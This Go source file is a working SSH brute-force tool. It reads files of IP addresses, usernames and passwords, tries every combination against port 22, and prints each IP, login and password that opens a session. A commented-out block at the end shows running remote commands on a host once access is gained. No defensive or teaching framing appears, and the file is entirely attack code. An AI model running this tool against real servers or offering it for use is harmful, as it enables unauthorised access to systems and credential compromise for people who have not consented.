package main

import (
        "bufio"
        "fmt"
        "os"
	"time"
//      "bytes"
        "golang.org/x/crypto/ssh"
)

func readLines(path string) ([]string, error) {
    file, err := os.Open(path)
    if err != nil {
        return nil, err
    }
   defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
    }
    return lines, scanner.Err()
}


func main() {
    ips, err := readLines("ip")
    if err != nil {
	fmt.Println("error open file")
    }
    logins, err := readLines("logins")
    if err != nil {
	fmt.Println("error open file")
    }
    passwords, err := readLines("passwords")
    if err != nil {
	fmt.Println("error open file")
    }

    for m:=0; m<len(ips); m++ {
        for i:=0; i<len(logins); i++ {
            for j:=0; j<len(passwords); j++ {
                clientConfig := &ssh.ClientConfig{
                User: logins[i],
                Auth: []ssh.AuthMethod{ssh.Password(passwords[j])},
		Timeout: time.Duration(time.Millisecond * 300),
                }
                client, err := ssh.Dial("tcp", ips[m] + ":22", clientConfig)
                if err != nil {
                    fmt.Printf("Failed ip:%s\n", ips[m])
                }
		if client != nil {
                    session, err2 := client.NewSession()
                    if err2 != nil {
                    	fmt.Println("Failed2")
                    }
                    if session != nil {
                        fmt.Println("----------------------------------------------------------")
                        fmt.Printf("ip: %s   login: %s   password: %s\n",ips[m], logins[i], passwords[j])
                        fmt.Println("----------------------------------------------------------")
                     }
                     defer session.Close()
		} else {
//			fmt.Println("Failed3")
		}		
            }
        }
    }

// for send remote commands

//      var b bytes.Buffer
//      session.Stdout = &b
//      if err := session.Run("ip r"); err != nil {
//              panic("Failed to run: " + err.Error())
//      }
//      fmt.Println(b.String())

}
